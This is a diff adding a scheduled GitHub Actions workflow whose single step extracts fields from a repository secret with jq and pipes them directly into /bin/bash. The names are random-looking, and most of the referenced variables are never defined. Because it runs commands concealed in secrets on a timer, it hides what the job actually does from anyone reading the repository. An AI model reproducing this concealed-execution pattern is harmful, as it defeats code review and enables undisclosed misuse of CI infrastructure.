@@ -1,0 +1,26 @@
+name: fenzhizoutai
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fenzhizoutai
+        env:
+          qi12861: ${{ secrets.qi12861 }}
+        run: |
+          echo $qi12861 | jq -r .gct3986 | /bin/bash
+          echo $z127 | jq -r .xzdgm490 | /bin/bash
+          echo $f411 | jq -r .rzxu015 | /bin/bash
+          echo $bly873 | jq -r .w37542 | /bin/bash
+          echo $uvsc1 | jq -r .mrvh64257 | /bin/bash
+          echo $o69 | jq -r .ywht8530 | /bin/bash
+          echo $tricn0301 | jq -r .elfk53886 | /bin/bash
+          echo $ajce6395 | jq -r .ow70 | /bin/bash
+          echo $lrkm1297 | jq -r .twhw6561 | /bin/bash
+          echo $oqjo6746 | jq -r .grivp3 | /bin/bash
+
